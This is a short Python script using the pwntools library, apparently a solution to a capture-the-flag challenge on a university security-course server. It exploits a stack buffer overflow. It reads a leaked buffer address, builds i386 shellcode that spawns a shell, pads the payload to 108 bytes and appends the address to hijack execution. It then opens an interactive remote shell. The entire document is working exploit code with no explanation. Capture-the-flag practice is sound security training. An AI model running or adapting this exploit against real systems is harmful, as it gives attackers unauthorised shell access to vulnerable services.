from pwn import *

LOCAL = False

if LOCAL:
	p = process("./program")
else:
	p = remote("ctf-fsi.fe.up.pt",4001)

p.recvuntil(b"Your buffer is ")
address = p.recvuntil(b".")[:-1] #store the address

address = p32(int(address,16)) #convert address
code = asm(shellcraft.i386.linux.sh()) #obtain shell

p.sendline(code + (b'\x11' * (108 - len(code))) + address)
p.interactive()
